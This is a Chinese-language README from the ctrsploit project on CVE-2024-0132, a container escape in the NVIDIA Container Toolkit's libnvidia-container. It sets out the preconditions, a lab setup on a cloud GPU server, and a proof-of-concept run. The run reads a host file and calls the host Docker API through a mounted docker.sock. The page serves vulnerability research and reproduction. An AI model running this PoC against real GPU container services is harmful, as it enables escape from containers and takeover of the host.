---

tags: sploit
author: ssst0n3
spec_version: v0.1.0
version: v0.1.0
changelog:
    - v0.1.0: init

---

# libnvidia-container CVE-2024-0132 容器逃逸

[edit](https://github.com/ctrsploit/ctrsploit/edit/main/vul/cve-2024-0132/README.md)

## 1. 漏洞介绍

漏洞产生于 nvidia-container-cli 的库 libnvidia-container.so 中，他们都属于 libnvidia-container。 libnvidia-container和其他相关工具组成了 NVIDIA Container Toolkit。 NVIDIA Container Toolkit是由NVIDIA公司推出的一套工具，用于在容器化环境中实现GPU加速计算。它允许用户在Docker等容器平台中使用NVIDIA GPU，从而在容器中运行需要GPU支持的应用程序，如深度学习训练、推理、科学计算等。

在 libnvidia-container >= 1.0.0, <= 1.16.1 版本中，存在一个容器逃逸漏洞。允许攻击者部署恶意容器，将主机任意文件以只读方式挂载到容器内，通过挂载runtime socket文件可以实现容器逃逸。

## 2. 利用场景

利用服务提供的运行自定义镜像的GPU容器功能，实现容器逃逸。

## 3. 前提条件

1. 安装了 nvidia-container-toolkit, 并支持 NVIDIA GPU 的容器环境
2. 允许用户部署自定义镜像的容器
3. nvidia-container-toolkit 以legacy模式(默认配置)运行

## 4. 漏洞存在性检查

`ctrsploit checksec cve-2024-0132`

## 5. 漏洞复现

* 复现环境: 华为云香港ECS(ubuntu 22.04, nvidia driver) + docker v27.1.0 + nvidia-container-toolkit v1.16.1
* 复现步骤:
    * 运行PoC镜像
* 目标现象: 显示在容器内访问了主机文件，可通过docker.sock调用docker API

### 5.1 复现环境

购买华为云香港节点弹性云服务器，我购买的具体配置如下

* 计费模式：按需计费
* 区域/可用区：中国-香港 | 随机分配
* 实例规格：GPU加速型 | pi2.2xlarge.4 | 8vCPUs | 32GiB | GPU显卡: 1 * NVIDIA Tesla T4 / 1 * 16GiB
* 操作系统镜像：Ubuntu 22.04 server 64bit with Tesla Driver 470.223.02 and CUDA 11.4

```
$ ssh wanglei-gpu3
root@wanglei-gpu3:~# nvidia-smi 
Tue Oct 15 11:13:33 2024       
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 470.223.02   Driver Version: 470.223.02   CUDA Version: 11.4     |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|                               |                      |               MIG M. |
|===============================+======================+======================|
|   0  Tesla T4            On   | 00000000:00:0D.0 Off |                    0 |
| N/A   30C    P8     9W /  70W |      0MiB / 15109MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
                                                                               
+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|        ID   ID                                                   Usage      |
|=============================================================================|
|  No running processes found                                                 |
+-----------------------------------------------------------------------------+
```

下面开始安装docker和nvidia-container-toolkit

```
root@wanglei-gpu3:~# apt update && apt install docker.io -y
root@wanglei-gpu3:~# curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \
    && curl -s -L https://nvidia.github.io/libnvidia-container/stable/deb/nvidia-container-toolkit.list | \
    sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' | \
    tee /etc/apt/sources.list.d/nvidia-container-toolkit.list
root@wanglei-gpu3:~# apt-get update && \
    apt-get install -y libnvidia-container1=1.16.1-1 \
    libnvidia-container-tools=1.16.1-1 \
    nvidia-container-toolkit-base=1.16.1-1 \
    nvidia-container-toolkit=1.16.1-1
```

配置容器运行时 nvidia

```
root@wanglei-gpu3:~# nvidia-ctk runtime configure --runtime=docker
WARN[0000] Ignoring runtime-config-override flag for docker 
INFO[0000] Config file does not exist; using empty config 
INFO[0000] Wrote updated config to /etc/docker/daemon.json 
INFO[0000] It is recommended that docker daemon be restarted.
root@wanglei-gpu3:~# systemctl restart docker
```

环境信息如下

```
root@wanglei-gpu3:~# nvidia-container-cli --version
cli-version: 1.16.1
lib-version: 1.16.1
build date: 2024-07-23T14:57+00:00
build revision: 4c2494f16573b585788a42e9c7bee76ecd48c73d
build compiler: x86_64-linux-gnu-gcc-7 7.5.0
build platform: x86_64
build flags: -D_GNU_SOURCE -D_FORTIFY_SOURCE=2 -DNDEBUG -std=gnu11 -O2 -g -fdata-sections -ffunction-sections -fplan9-extensions -fstack-protector -fno-strict-aliasing -fvisibility=hidden -Wall -Wextra -Wcast-align -Wpointer-arith -Wmissing-prototypes -Wnonnull -Wwrite-strings -Wlogical-op -Wformat=2 -Wmissing-format-attribute -Winit-self -Wshadow -Wstrict-prototypes -Wunreachable-code -Wconversion -Wsign-conversion -Wno-unknown-warning-option -Wno-format-extra-args -Wno-gnu-alignof-expression -Wl,-zrelro -Wl,-znow -Wl,-zdefs -Wl,--gc-sections
root@wanglei-gpu3:~# 
root@wanglei-gpu3:~# nvidia-container-cli info
NVRM version:   470.223.02
CUDA version:   11.4

Device Index:   0
Device Minor:   0
Model:          Tesla T4
Brand:          Nvidia
GPU UUID:       GPU-03ef96a1-75d6-9917-ed12-4db7f79bfa4b
Bus Location:   00000000:00:0d.0
Architecture:   7.5
root@wanglei-gpu3:~# 
root@wanglei-gpu3:~# docker info
Client:
 Version:    24.0.7
 Context:    default
 Debug Mode: false

Server:
 Containers: 0
  Running: 0
  Paused: 0
  Stopped: 0
 Images: 0
 Server Version: 24.0.7
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Using metacopy: false
  Native Overlay Diff: true
  userxattr: false
 Logging Driver: json-file
 Cgroup Driver: systemd
 Cgroup Version: 2
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: io.containerd.runc.v2 nvidia runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 
 runc version: 
 init version: 
 Security Options:
  apparmor
  seccomp
   Profile: builtin
  cgroupns
 Kernel Version: 5.15.0-76-generic
 Operating System: Ubuntu 22.04.2 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 8
 Total Memory: 31.15GiB
 Name: wanglei-gpu3
 ID: bc9d2464-60ee-458d-93a0-fab77847a4b3
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Live Restore Enabled: false
```

### 5.2 漏洞复现

> Note: 利用该漏洞需要具备部署自定义镜像的权限，ctrsploit仅提供漏洞利用的方法，无法直接通过ctrsploit来利用漏洞。

```
$ ctrsploit exploit cve-2024-0132
please run:
docker run -ti --runtime=nvidia --gpus=all ssst0n3/poc-cve-2024-0132

reference: https://github.com/ctrsploit/ctrsploit/blob/public/vul/cve-2024-0132/README.md
```

使用预先构建的poc镜像 ssst0n3/poc-cve-2024-0132 , 或临时构建。

```
root@wanglei-gpu3:~# git clone https://github.com/ssst0n3/poc-cve-2024-0132.git
root@wanglei-gpu3:~# cd poc-cve-2024-0132
root@wanglei-gpu3:~/poc-cve-2024-0132# docker build -t ssst0n3/poc-cve-2024-0132 .
...
root@wanglei-gpu3:~/poc-cve-2024-0132# docker run -ti --runtime=nvidia --gpus=all ssst0n3/poc-cve-2024-0132
+ cat /host/etc/hostname
wanglei-gpu3
+ curl --unix-socket /host-run/docker.sock http://localhost/containers/json
[{"Id":"6dac93a4b9aaa6e2db5bed64f550d111e6e9604375e3210b46b59b095635290f","Names":["/nifty_booth"],"Image":"ssst0n3/poc-cve-2024-0132","ImageID":"sha256:53f3d5c92e144343851ec800aa7a0af201517262498519cc4dfd53688da9b112","Command":"/bin/sh -c /entrypoint.sh","Created":1728996664,"Ports":[],"Labels":{"org.opencontainers.image.ref.name":"ubuntu","org.opencontainers.image.version":"24.04"},"State":"running","Status":"Up Less than a second","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"72649d2ea91c5c657b26de4af617b491e8f09bf9c2e5e8a44695ff10e68191b6","EndpointID":"be81eb91bfafd69bb442f3ccf9790ff5da9ae9ef42ad643aa4a686c3040f404b","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[]}]
```
